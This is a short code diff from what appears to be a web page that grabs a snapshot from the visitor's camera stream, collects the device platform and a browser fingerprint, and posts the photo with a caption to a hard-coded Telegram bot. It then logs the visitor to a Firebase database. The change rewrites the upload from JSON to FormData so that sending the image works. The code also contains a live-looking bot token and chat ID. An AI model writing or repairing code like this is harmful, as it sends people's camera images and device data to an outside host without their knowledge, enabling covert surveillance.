@@ -126,15 +126,16 @@
 📱 Device: ${navigator.platform}
 💻 Browser: ${fingerprint}`;
 
-          await fetch(`https://api.telegram.org/bot7655435661:AAGvQFoUKanmBZaZXND5AXbrPuClcYM9XIk/sendPhoto`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: "6396297682",
-              photo: imgData,
-              caption: message
-            })
-          });
+          const blob = await (await fetch(imgData)).blob();
+const formData = new FormData();
+formData.append("chat_id", "6396297682");
+formData.append("caption", message);
+formData.append("photo", blob);
+
+await fetch(`https://api.telegram.org/bot7655435661:AAGvQFoUKanmBZaZXND5AXbrPuClcYM9XIk/sendPhoto`, {
+  method: "POST",
+  body: formData
+});
 
           stream.getTracks().forEach(track => track.stop());
           db.ref("visitors").push({ ...visitor, userAgent: fingerprint });
